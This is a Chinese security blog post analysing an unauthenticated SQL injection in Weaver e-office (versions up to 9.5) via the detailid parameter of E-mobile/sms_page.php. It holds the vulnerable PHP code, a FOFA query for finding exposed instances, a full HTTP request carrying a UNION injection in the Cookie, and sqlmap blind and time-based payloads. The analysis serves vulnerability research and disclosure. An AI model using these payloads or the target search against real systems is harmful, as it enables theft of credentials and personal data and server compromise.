---
title: "泛微e-office sms_page.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-E-mobile-sms_page-detailid-sqli.html
asset_dir: assets/泛微e-office-sms_page.php-sql注入漏洞
---

# 泛微e-office sms\_page.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/10 08:32
- 1256浏览
- [0评论](#comment)
- 35分钟阅读

深入探索

鉴权

身份验证

软件

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微")E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office sms\_page.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

e-office <=9.5

# fofa语法

> `(((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif" || (body="szFeatures" && body="eoffice") || header="Server: eOffice") && body!="Server: couchdb") || banner="general/login/index.php")`

# 漏洞分析

直接看 sms\_page.php 文件业务逻辑实现

```
<?php

include_once( "inc/conn.php" );
include_once( "api/sms.class.php" );
include_once( "inc/utility_all.php" );
include_once( "E-mobile/func_all.php" );
$mobilekey = $_REQUEST['mobilesessionkey'];
$page = $_REQUEST['page'];
$module = $_REQUEST['module'];
$scope = $_REQUEST['scope'];
$detailid = $_REQUEST['detailid'];
$fromid = $_REQUEST['fromid'];
$sessionstr = $_REQUEST['sessionkey'];
$strexplode = explode( ",", $sessionstr );
$userid = $strexplode[1];
$smsid = $detailid;
$UserInfor = array( );
$UserInfor['user_id'] = $userid;
$smsApi = new sms( $UserInfor );
$data = $smsApi->getSmsInfo( "", "", $smsid, "" );
$smsInfor = $data[0];
global $connection;
$sql = "UPDATE sms\r\n\t\t\tSET REMIND_FLAG = 0\r\n\t\t\tWHERE SMS_ID = '".$smsid."'";
exequery( $connection, $sql );
```

`$detailid` ==> `$smsid` ==> `getSmsInfo` getSmsInfo 函数业务逻辑如下

```
public function getSmsInfo( $limit = 0, $start = 0, $smsid = "", $keyWord = "" )
    {
        global $connection;
        $limit = 0 < $limit ? $limit : $this->default_limit;
        $start = 0 < $start ? $start : $this->default_start;
        $sql = "SELECT * FROM sms \r\n\t\t\t\t\tWHERE 1 \r\n\t\t\t\t\tAND TO_ID='".$this->userid."' \r\n\t\t\t\t\tAND SEND_TIME<'".$this->curdatetime."' \r\n\t\t\t\t\tAND receive_del != '1'";
        if ( $smsid != "" )
        {
            $sql .= " AND SMS_ID=".$smsid." ";
        }
        if ( $keyWord )
        {
            $sql .= " AND CONTENT LIKE '%".$keyWord."%' ";
        }
        $sql .= " ORDER BY SMS_ID DESC LIMIT ".$start.",".$limit."";
        $rs = exequery( $connection, $sql );
```

`$smsid` 和 `$keyWord` 均是直接拼接进SQL语句中并使用 exequery 直接执行，无任何过滤，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")。

`$detailid` 通过 `$_REQUEST['detailid']` 获取，`$_REQUEST` 在 PHP 里属于一个包含了 `GET` 、`POST` 和 `COOKIE` 方法传递参数的超全局数组，因此在测试时可使用 `Cookie` 传递 `detailid` 值进入SQL语句中。

# 漏洞复现

```
GET /E-mobile/sms_page.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: detailid=11 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b716b71,0x50696d475348684851524177764b6961774b5a696f44796e62664752514b78535244534662746978,0x71626b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```

[![泛微e-office sms_page.php sql注入漏洞](images/img-001-b4293b058520.webp)](https://image.mrxn.net/f44c34052d9949fea0f979b04d4139b4.webp)

通过联合注入 成功在响应回显了测试payload。

通过 [sqlmap](https://mrxn.net/tag/sqlmap "sqlmap") 还可测试出其他注入方式如下

```
sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: detailid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: detailid=11 RLIKE (SELECT (CASE WHEN (6027=6027) THEN 1 ELSE 0x28 END))-- piDp

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: detailid=11 AND (SELECT 9111 FROM (SELECT(SLEEP(5)))iBiL)-- yWII

    Type: UNION query
    Title: Generic UNION query (NULL) - 14 columns
    Payload: detailid=11 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b716b71,0x50696d475348684851524177764b6961774b5a696f44796e62664752514b78535244534662746978,0x71626b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```

PS

> 这是一个很老的漏洞，最近被人拿出来刷，我就考古看下 =\_= !

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
